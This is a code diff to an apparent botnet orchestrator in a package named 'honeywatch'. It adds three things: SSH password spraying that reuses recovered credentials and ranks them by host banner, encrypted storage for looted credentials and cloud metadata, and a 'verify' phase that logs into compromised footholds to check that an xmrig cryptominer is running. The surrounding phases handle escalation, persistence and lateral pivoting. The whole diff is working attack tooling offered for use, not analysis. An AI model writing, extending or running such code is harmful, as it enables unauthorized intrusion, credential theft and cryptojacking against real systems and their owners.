@@ -56,6 +56,7 @@ class ChainPhase(str, Enum):
     ESCALATE = "escalate"
     LOOT = "loot"        # credential + cloud metadata exfil from footholds
     PERSIST = "persist"
+    VERIFY = "verify"    # post-deploy health check: is the miner actually running?
     PIVOT = "pivot"
 
 
@@ -426,6 +427,13 @@ class ChainOrchestrator:
         from honeywatch.store import Store
         return Store(self.cfg.db_path, vault_passphrase=self.cfg.vault_passphrase)
 
+    def _vault_key(self) -> bytes | None:
+        """Derive the vault encryption key from the configured passphrase."""
+        if not self.cfg.vault_passphrase:
+            return None
+        from honeywatch.c2.crypto import derive_vault_key
+        return derive_vault_key(self.cfg.vault_passphrase)
+
     def _reconcile_from_store(self) -> None:
         """Rebuild in-memory state from the durable store (source of truth).
 
@@ -675,9 +683,45 @@ class ChainOrchestrator:
                          if c.get("password")}
             recovered -= set(passwords)
             if recovered:
-                passwords = list(recovered) + list(passwords)
-                self._emit(ChainPhase.SPRAY,
-                           f"reuse-creds: {len(recovered)} recovered password(s) prepended")
+                # Smart credential reuse: group recovered passwords by the
+                # SSH banner of the host they worked on. For each sprayable
+                # host, prioritize passwords that worked on same-banner hosts.
+                banner_passwords: dict[str, list[str]] = {}
+                try:
+                    conn_spray = store._connect()
+                    try:
+                        cred_rows = store.query_credentials(limit=100000)
+                        for cred in cred_rows:
+                            pw = cred.get("password")
+                            if not pw:
+                                continue
+                            host_row = conn_spray.execute(
+                                "SELECT banner FROM hosts WHERE ip = ? AND port = ?",
+                                (cred.get("ip"), cred.get("port")),
+                            ).fetchone()
+                            banner = host_row[0] if host_row and host_row[0] else "unknown"
+                            banner_passwords.setdefault(banner, []).append(pw)
+                    finally:
+                        store._close(conn_spray)
+                except Exception:
+                    # If the banner query fails, fall back to simple prepend.
+                    banner_passwords = {}
+                if banner_passwords:
+                    # Deduplicated, banner-prioritized password list.
+                    priority_pws = []
+                    seen_pws: set = set()
+                    for pws in banner_passwords.values():
+                        for pw in pws:
+                            if pw not in seen_pws and pw not in set(passwords):
+                                priority_pws.append(pw)
+                                seen_pws.add(pw)
+                    passwords = priority_pws + list(passwords)
+                    self._emit(ChainPhase.SPRAY,
+                               f"reuse-creds: {len(priority_pws)} banner-prioritized password(s)")
+                else:
+                    passwords = list(recovered) + list(passwords)
+                    self._emit(ChainPhase.SPRAY,
+                               f"reuse-creds: {len(recovered)} recovered password(s) prepended")
 
         hosts = [SprayHost(ip=ip, port=port, users=list(users))
                  for ip, port in self.state.sprayable]
@@ -1180,6 +1224,7 @@ class ChainOrchestrator:
                 res = await asyncio.to_thread(
                     grab_loot, ip=ip, port=port, user=user, password=pw,
                     stash_dir=self.cfg.shadow_stash,  # share the stash root
+                    vault_key=self._vault_key(),
                 )
             already_looted.add(key)
             self.state.looted_footholds.append(key)
@@ -1463,6 +1508,57 @@ class ChainOrchestrator:
         if "cleanup" not in chain:
             chain.append("cleanup")
         return chain
+
+    async def phase_verify(self) -> None:
+        """Verify deployed miners are actually running on each foothold.
+
+        A deploy task that reports success (exit 0) might have failed to start
+        the miner (wrong pool, bad binary, permission error). This phase SSHes
+        into each foothold and checks ``pgrep -x xmrig`` — if the process
+        exists, the deploy is confirmed. If not, the chain logs a verification
+        failure for the operator to investigate.
+        """
+        if not self.state.footholds:
+            self._emit(ChainPhase.VERIFY, "skipping verify (no footholds)")
+            return
+
+        sem = self._sem
+        verified_running = 0
+        verified_total = 0
+
+        async def _check(foo: tuple) -> str:
+            ip, port, user, pw = foo
+            key_path = None
+            actual_pw = pw
+            if actual_pw and actual_pw.startswith("key:"):
+                key_path = actual_pw[4:]
+                actual_pw = None
+            async with sem:
+                rc, out, _ = await asyncio.to_thread(
+                    _ssh_exec, ip, port, user, actual_pw, key_path,
+                    "pgrep -x xmrig >/dev/null 2>&1 && echo RUNNING || echo NOT_RUNNING",
+                    10.0,
+                )
+            status = "running" if "RUNNING" in (out or "") else "not_running"
+            return (ip, port, status)
+
+        results = await asyncio.gather(
+            *(_check(f) for f in self.state.footholds), return_exceptions=True
+        )
+        for r in results:
+            if isinstance(r, Exception):
+                self._emit(ChainPhase.VERIFY, f"verify error: {r}")
+                continue
+            ip, port, status = r
+            verified_total += 1
+            if status == "running":
+                verified_running += 1
+            else:
+                self._emit(ChainPhase.VERIFY,
+                            f"verify FAILED: {ip}:{port} — miner not running")
+
+        self._emit(ChainPhase.VERIFY,
+                    f"verify: {verified_running}/{verified_total} miners running")
 
     async def phase_pivot(self) -> None:
         """Discover adjacent subnets + lateral pivot targets from each foothold.
@@ -1816,6 +1912,7 @@ class ChainOrchestrator:
             await _run_phase(ChainPhase.ESCALATE, self.phase_escalate())
             await _run_phase(ChainPhase.LOOT, self.phase_loot())
             await _run_phase(ChainPhase.PERSIST, self.phase_persist())
+            await _run_phase(ChainPhase.VERIFY, self.phase_verify())
             await _run_phase(ChainPhase.PIVOT, self.phase_pivot())
             # Final checkpoint after the full round (redundant with per-phase
             # checkpoint but ensures the round counter is persisted).
